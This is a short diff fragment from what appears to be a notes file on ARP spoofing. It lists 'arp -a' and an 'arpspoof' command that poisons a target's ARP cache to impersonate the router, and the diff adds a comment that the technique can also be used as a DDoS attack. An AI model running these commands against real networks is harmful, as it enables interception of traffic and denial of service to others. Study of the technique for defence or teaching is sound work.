@@ -3,6 +3,7 @@
 arp -a 
 
 #We tell the target machine that we are the router/spoofing
+#Can also be used as a DDOS attack
 arpspoof -i interface -t targetip routerip
 
 #We tell the router that we are actually the target device
